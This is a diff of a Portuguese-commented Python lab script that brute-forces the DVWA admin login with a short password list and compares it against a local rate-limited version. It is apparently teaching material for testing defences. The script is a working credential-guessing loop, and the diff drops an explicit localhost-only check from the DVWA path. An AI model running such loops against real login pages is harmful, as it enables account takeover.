@@ -1,56 +1,49 @@
-"""Demonstração de força bruta, restrita a um DVWA executado localmente."""
-import json
-import os
+"""Compara força bruta no DVWA vulnerável e no ambiente protegido local."""
 import time
-from pathlib import Path
-from urllib.parse import urlparse
 
 import requests
 
-URL = os.getenv("DVWA_BRUTE_URL", "http://localhost:8080/vulnerabilities/brute/")
-SESSION_ID = os.getenv("DVWA_PHPSESSID", "")
-PASSWORDS = ["123456", "admin", "password", "root", "password123"]
+from common import (dvwa_cookies, dvwa_url, local_url, new_result, print_and_save,
+                    profile_args, protected_base_url, selected_profiles)
+
+# A senha de laboratório aparece após seis valores inválidos para evidenciar o bloqueio.
+PASSWORDS = ["123456", "admin", "root", "password123", "qwerty", "letmein", "password"]
 
 
-def only_local(url: str) -> None:
-    if urlparse(url).hostname not in {"localhost", "127.0.0.1", "::1"}:
-        raise ValueError("Este script aceita somente URLs locais do laboratório.")
+def run_vulnerable() -> dict:
+    url, cookies = dvwa_url("DVWA_BRUTE_URL", "/vulnerabilities/brute/"), dvwa_cookies()
+    started, attempts, last_status = time.perf_counter(), 0, None
+    for password in PASSWORDS:
+        attempts += 1
+        response = requests.get(url, params={"username": "admin", "password": password, "Login": "Login"}, cookies=cookies, timeout=10)
+        last_status = response.status_code
+        if "Welcome to the password protected area" in response.text:
+            return new_result(profile="vulneravel", attack="forca_bruta", success=True, attempts=attempts, elapsed=time.perf_counter() - started, status_code=last_status, outcome="credencial_aceita_sem_rate_limit")
+    return new_result(profile="vulneravel", attack="forca_bruta", success=False, attempts=attempts, elapsed=time.perf_counter() - started, status_code=last_status, outcome="credencial_nao_encontrada")
 
 
-def save_result(data: dict) -> None:
-    report = Path(__file__).parents[1] / "resultados" / "relatorio_testes.json"
-    entries = json.loads(report.read_text(encoding="utf-8")) if report.exists() else []
-    entries.append(data)
-    report.write_text(json.dumps(entries, ensure_ascii=False, indent=2), encoding="utf-8")
+def run_protected() -> dict:
+    url = local_url(f"{protected_base_url()}/login.php")
+    started, attempts, last_status = time.perf_counter(), 0, None
+    for password in PASSWORDS:
+        attempts += 1
+        response = requests.post(url, data={"username": "admin", "password": password}, timeout=10)
+        last_status = response.status_code
+        if response.status_code == 429:
+            return new_result(profile="protegido", attack="forca_bruta", success=False, attempts=attempts, elapsed=time.perf_counter() - started, status_code=last_status, outcome="bloqueado_por_rate_limit")
+        if "Autenticação realizada." in response.text:
+            return new_result(profile="protegido", attack="forca_bruta", success=True, attempts=attempts, elapsed=time.perf_counter() - started, status_code=last_status, outcome="credencial_aceita")
+    return new_result(profile="protegido", attack="forca_bruta", success=False, attempts=attempts, elapsed=time.perf_counter() - started, status_code=last_status, outcome="sem_acesso")
 
 
 def main() -> None:
-    only_local(URL)
-    if not SESSION_ID:
-        raise SystemExit("Defina DVWA_PHPSESSID após autenticar-se no DVWA.")
-
-    started = time.perf_counter()
-    success = False
-    attempts = 0
-    found_password = None
-    cookies = {"PHPSESSID": SESSION_ID, "security": "low"}
-    for password in PASSWORDS:
-        attempts += 1
-        response = requests.get(
-            URL,
-            params={"username": "admin", "password": password, "Login": "Login"},
-            cookies=cookies,
-            timeout=10,
-        )
-        if "Welcome to the password protected area" in response.text:
-            success, found_password = True, password
-            break
-
-    elapsed = round(time.perf_counter() - started, 3)
-    result = {"teste": "forca_bruta", "sucesso": success, "tentativas": attempts,
-              "tempo_segundos": elapsed, "senha_encontrada": found_password}
-    save_result(result)
-    print(json.dumps(result, ensure_ascii=False))
+    args = profile_args(__doc__ or "Teste de força bruta")
+    for profile in selected_profiles(args.perfil):
+        try:
+            result = run_vulnerable() if profile == "vulneravel" else run_protected()
+        except (requests.RequestException, ValueError) as error:
+            result = new_result(profile=profile, attack="forca_bruta", success=False, attempts=0, elapsed=0, status_code=None, outcome="erro_de_execucao", erro=str(error))
+        print_and_save(result)
 
 
 if __name__ == "__main__":
